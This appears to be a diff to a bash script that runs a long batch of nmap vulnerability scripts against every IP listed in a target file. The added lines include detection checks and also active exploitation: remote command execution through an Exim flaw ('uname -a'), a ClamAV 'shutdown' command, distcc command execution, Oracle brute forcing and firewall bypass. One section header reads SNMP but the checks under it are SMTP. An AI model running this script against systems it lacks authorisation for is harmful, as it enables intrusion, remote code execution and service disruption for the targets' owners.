@@ -26,6 +26,7 @@ do
 	nmap -p445 --script smb-vuln-ms17-010 $target
 	nmap -O --script smb2-vuln-uptime $target
 	nmap -p445 --script smb2-vuln-uptime --script-args smb2-vuln-uptime.skip-os=true $target
+	nmap --script=samba-vuln-cve-2012-1182  -p 139 $target
 	echo
 	printf "\033[1;35mStarting to scan $target for FTP vulns...\033[0m\n"
 	nmap -p 21 --script ftp-anon $target
@@ -38,7 +39,14 @@ do
 	printf "\033[1;35mStarting to scan $target for RDP vulns...\033[0m\n"
 	nmap -sV --script=rdp-vuln-ms12-020 -p 3389 $target
 	echo
+        printf "\033[1;35mStarting to scan $target for MySQL vulns...\033[0m\n"
+	echo
+	nmap -sV --script=mysql-empty-password $target
+	nmap -p3306 --script mysql-vuln-cve2012-2122 $target
+	nmap -sV --script mysql-vuln-cve2012-2122 $target
 	printf "\033[1;35mStarting to scan $target for HTTP vulns...\033[0m\n"
+	nmap -sV --script http-adobe-coldfusion-apsa1301 $target
+	nmap -p80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $target
 	nmap --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" $target
 	nmap -sV --script=http-enum $target
 	nmap -p80 --script http-errors.nse $target
@@ -109,15 +117,27 @@ do
 	nmap -p80 --script http-axis2-dir-traversal $target
 	nmap --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p 80 $target
 	nmap --script http-vmware-path-vuln -p80,443,8222,8333 $target
+	nmap --script http-slowloris-check  $target
+	echo
+        printf "\033[1;35mStarting to scan $target for SNMP vulns...\033[0m\n"
+	nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 $target
+	nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 $target
+	nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=<domain>' -pT:25,465,587 $target
+	nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 $target
 	echo
         printf "\033[1;35mStarting to scan $target for DNS vulns...\033[0m\n"
 	nmap -sU -p 53 --script=dns-random-srcport $target
 	nmap -sU -p 53 --script=dns-random-txid $target
 	echo
 done < /tmp/Target_IPs
-printf "\033[1;33mStarting a scan for vulnerabilities in other protocols against discovered machines...\033[0m\n"
+printf "\033[1;33mStarting a scan for vulnerabilities in other protocols/products...\033[0m\n"
 while read target2;
 do
+	echo
+        printf "\033[1;35mStarting to scan $target2 for ClamAV vulns...\033[0m\n"
+	nmap -sV --script clamav-exec $target2
+	nmap --script clamav-exec --script-args cmd='scan',scandb='files.txt' $target2
+	nmap --script clamav-exec --script-args cmd='shutdown' $target2
 	echo
 	printf "\033[1;35mStarting to scan $target2 for distcc vulns...\033[0m\n"
 	nmap -p 3632 $target2 --script distcc-exec --script-args="distcc-exec.cmd='id'"
@@ -127,9 +147,30 @@ do
 	echo
         printf "\033[1;35mStarting to scan $target2 for ipmi vulns...\033[0m\n"
 	nmap -sU --script ipmi-cipher-zero -p 623 $target2
+	nmap -p49152 --script supermicro-ipmi-conf $target2
 	echo
-        printf "\033[1;35mStarting to scan $target2 for ipmi vulns...\033[0m\n"
+        printf "\033[1;35mStarting to scan $target2 for netbus vulns...\033[0m\n"
 	nmap -p 12345 --script netbus-auth-bypass $target2
+	echo 
+	printf "\033[1;35mStarting to scan $target2 for Oracle vulns...\033[0m\n"
+	nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL $target2
+	nmap --script=rmi-vuln-classloader -p 1099 $target2
+	echo 
+        printf "\033[1;35mStarting to scan $target2 for VNC vulns...\033[0m\n"
+	nmap -sV --script=vnc-title $target2
+	nmap -sV --script=realvnc-auth-bypass $target2
+	echo 
+        printf "\033[1;35mStarting to scan $target2 for TLS vulns...\033[0m\n"
+	nmap -p 443 --script ssl-heartbleed $target2
+	nmap -sV --script=sslv2-drown $target2
+	nmap -p 443 --script tls-ticketbleed $target2
+	echo 
+        printf "\033[1;35mStarting to scan $target2 for firewall-bypass vulns...\033[0m\n"
+	nmap --script firewall-bypass $target2
+	nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 $target2
+	echo 
+        printf "\033[1;35mStarting to scan $target2 for WDB vulns...\033[0m\n"
+	nmap -sU -p 17185 --script wdb-version $target2
 done < /tmp/Target_IPs
 printf "\033[1;35mDone!\033[0m\n"
 
